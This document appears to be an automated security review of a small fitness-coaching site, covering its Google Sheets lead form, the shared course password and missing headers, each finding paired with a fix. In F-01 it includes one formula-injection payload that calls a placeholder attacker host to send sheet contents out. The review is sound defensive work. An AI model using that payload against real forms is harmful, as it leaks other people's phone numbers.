# Security report: fit-balance

Date: 2026-11-23 · Scope: code only · Facts from scanners: 2

## Summary
1. Stop anyone from planting formulas in the leads Google Sheet: in `Code.gs`, put a `'` in front of any name or answer that starts with `= + - @`.
2. Stop saving the course password as plain text in the browser (`localStorage`), and plan for per-buyer access or a password you change regularly.
3. Move `apps-script/Code.gs` out of the published folder, add security headers in a Netlify `_headers` file, and add a limit on how many leads the Apps Script accepts.

## Findings

### F-01 · MEDIUM · A05 Injection
**What can happen:** Anyone can send a name such as `=IMPORTDATA("https://attacker/?"&C2)` straight to the public Apps Script address. It is saved as a live formula in the leads sheet, so when Yahav opens the sheet it can send other women's phone numbers to an outside site or show a fake link.
**Where:** `fit-balance-site/apps-script/Code.gs:55`, `fit-balance-site/apps-script/Code.gs:57`, `fit-balance-site/apps-script/Code.gs:58`, `fit-balance-site/apps-script/Code.gs:66`, `fit-balance-site/apps-script/Code.gs:86`
**Evidence:** `sh.appendRow([new Date(), name, "'" + phone, hard, source, 'חדש', '']);`: only `phone` gets the protective `'`. `clean_` only removes `<>` (`.replace(/[<>]/g, '')`). `hard` and `source` come from the browser and can be set to anything by someone who calls the URL directly.
**Fix:** In `clean_`, add a `'` in front of values that start with a formula character: `var s = String(v || '').replace(/[<>]/g, '').trim().slice(0, max); return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;`. Also only accept `hard` values from the dropdown list (plus the unlock text "ביקשה את התכנים החינמיים"), and only accept `source` values from `['אתר','תוכן חינמי']`. Deploy a new version in the Apps Script editor.
**Verify:** Run `testLead()` with `name: '=1+1'`. The new row should show the text `=1+1`, not `2`.

### F-02 · MEDIUM · A06 Insecure Design
**What can happen:** A script can POST thousands of fake leads to the public Apps Script URL. Each one fills the sheet and sends Yahav an email, until Google's daily mail limit runs out and real leads stop sending emails.
**Where:** `fit-balance-site/apps-script/Code.gs:49`, `fit-balance-site/apps-script/Code.gs:71`, `fit-balance-site/index.html:816`
**Evidence:** `function doPost(e) {` … `if (p.website) return ok_();`. The hidden honeypot field is the only check. There is no count or time limit before `MailApp.sendEmail({ to: NOTIFY_EMAIL, ...`.
**Fix:** In `doPost`, use `CacheService.getScriptCache()` to keep a count per phone number (for example, ignore the same phone twice in 10 minutes) and an overall count (for example, at most 50 leads an hour). Above the limit, skip both the email and the new row. Also skip the email when `MailApp.getRemainingDailyQuota() < 10`.
**Verify:** Send the same phone number 3 times within a minute. Only one row and one email should appear.

### F-03 · MEDIUM · A07 Authentication Failures
**What can happen:** The course password is saved as plain text in the browser. Anyone who uses the same phone or computer, or any script that runs on the site, can read it and share it.
**Where:** `course-area/template.html:143`, `course-area/template.html:161`, `course-area/template.html:173`
**Evidence:** `var KEEP_KEY = 'fb_course_pw'` … `if (keep) store(KEEP_KEY, pw);`, and `store` calls `localStorage.setItem(k, v)`. The "remember me" box is checked by default (`<input type="checkbox" id="keep" checked>`).
**Fix:** Don't store the password itself. After a successful unlock, store the decrypted course data in `sessionStorage` (it is cleared when the tab closes), or store a derived key with a short expiry. Also make "remember me" unchecked by default.
**Verify:** Log in, then open DevTools → Application → Local Storage on `/my-course/`. There should be no `fb_course_pw` entry.

### F-04 · MEDIUM · A06 Insecure Design
**What can happen:** Every buyer gets the same password, and the encrypted course file is public. If one buyer shares the password, anyone gets in, and you cannot shut out one person. Anyone can also download the file and try guessing the password offline with no limit.
**Where:** `course-area/encrypt.mjs:21`, `course-area/encrypt.mjs:36`, `course-area/template.html:141`
**Evidence:** `if (!pw || pw.length < 8)`, so 8 characters is the minimum. `const payload = JSON.stringify({ salt: ..., iv: ..., iter, data: ... })` is written into the public `fit-balance-site/my-course/index.html`. CLAUDE.md says "one shared password (sent in the Cardcom email)".
**Fix:** Short term: require a long random password (at least 16 characters, generated rather than chosen), and change it now and then by running `encrypt.mjs` again. Longer term: use a login that checks each buyer separately (for example Netlify Identity or a course platform), so one buyer's access can be removed.
**Verify:** `encrypt.mjs` refuses a password shorter than 16 characters. After you change the password, the old one no longer opens `/my-course/`.

### F-05 · LOW · A02 Security Misconfiguration
**What can happen:** The source code of the leads script is published on the live site. Anyone can read Yahav's notification email address and see exactly which checks the form does, which makes F-01 and F-02 easier.
**Where:** `fit-balance-site/apps-script/Code.gs:15`
**Evidence:** The file sits inside the Netlify publish folder (`fit-balance-site/` = "Netlify publish directory" in CLAUDE.md) and contains `const NOTIFY_EMAIL = 'yaha…'`.
**Fix:** Move `apps-script/` to the repo root, next to `course-area/` and outside `fit-balance-site/`.
**Verify:** After deploying, `https://fit-balance.co.il/apps-script/Code.gs` returns 404.

### F-06 · LOW · A02 Security Misconfiguration
**What can happen:** No security headers are set anywhere. Without them, the site can be loaded inside a frame on another site, and any injected script would not be blocked. This matters more for `/my-course/`, which holds the password.
**Where:** `fit-balance-site/index.html:1`, `course-area/template.html:1`
**Evidence:** There is no `_headers` or `netlify.toml` file in the project, and no `Content-Security-Policy` meta tag in any page (a search for `Content-Security-Policy` and `http-equiv` found nothing).
**Fix:** Add `fit-balance-site/_headers` with `/*` and these lines: `Content-Security-Policy` (allow self, fonts.googleapis.com, fonts.gstatic.com, i.ytimg.com, www.youtube-nocookie.com, player.vimeo.com, script.google.com; `frame-ancestors 'none'`), `Strict-Transport-Security: max-age=31536000`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Test it on a Deploy Preview first, because the pages have inline scripts and styles.
**Verify:** Open the Deploy Preview, then DevTools → Network → the document → Response Headers. All six headers should be there and nothing should break.

### F-07 · LOW · A06 Insecure Design
**What can happen:** The "unlock after leaving details" box only works in the browser. The PDFs are public files, and anyone can open them directly without leaving a name or phone, so the lead list is easy to skip.
**Where:** `fit-balance-site/index.html:433`, `fit-balance-site/index.html:443`, `fit-balance-site/index.html:848`
**Evidence:** `<a class="pdf-link" data-href="media/guides/fit-balance-3-recipes.pdf" href="#unlock">`: the real file path is already in the page.
**Fix:** If the gate only collects leads and the content is free anyway, you can accept this. If the PDFs should really be protected, send them by email or WhatsApp after a lead arrives instead of hosting them in `media/guides/`.
**Verify:** Decide which of the two you want. If protected, `https://fit-balance.co.il/media/guides/fit-balance-3-recipes.pdf` returns 404.

## Data inventory

| Data | Stored in | Used for | Sensitive |
|---|---|---|---|
| Name | Google Sheet "פניות", tab "פניות"; email to Yahav | Calling back, unlocking free content | No |
| Phone number | Google Sheet; email to Yahav (also as a wa.me link) | Calling back / WhatsApp | No (personal contact) |
| "What is hardest for you" answer (for example "אכילה בערב / אכילה רגשית") | Google Sheet; email to Yahav | Lead qualification | Possibly: hints at eating or health habits |
| Source, date, status, notes | Google Sheet | Lead tracking | No |
| Course password | Buyer's browser `localStorage` (`fb_course_pw`) | Auto-login | Yes (credential) |
| Lessons watched | Buyer's browser `localStorage` (`fb_course_done_v1`) | Progress bar | No |
| Buyer name and contact, card data | Cardcom (outside this code) | Payment, receipt, book delivery | Payment data stays at Cardcom |
| Onboarding questionnaire (health information) | Outside the site (privacy.html line 74) | Personal plan | Yes (health) |

Questions for the owner: how long do lead rows stay in the sheet? privacy.html only says "as long as it is needed". Is the "hard" answer needed in the email, or only in the sheet? Where is the health questionnaire stored, and who can read it?

## Accepted risks

None.

## Not checked

- The facts file (`facts.json`, 2 facts) could not be opened: the read was refused because of the short Windows path. The scanner facts were not confirmed one by one, and this report rests on my own reading of the code.
- Apps Script deployment settings ("execute as me", "anyone") and the Google Sheet's sharing settings: these live in Google, not in the code.
- Whether the Google Drive worksheet links (sharing set to "anyone with the link") and the workbook are reachable without buying, and whether this repo is public. `course-area/lessons.json` lists them in plain text, outside the encryption.
- Vimeo embed domain limits, and the Cardcom email that contains the course password.
- The live site and its real response headers (no URL was given to check), the Netlify account, and 2FA on the Netlify, Google and Cardcom accounts.
- `fit-balance-site/my-course/index.html` is not in the repo (it is generated), so the published build was not reviewed. Only its template was.
- The PDFs and media files were not checked for hidden metadata.

---
This report is a second reader, not a penetration test, a certificate or legal advice.
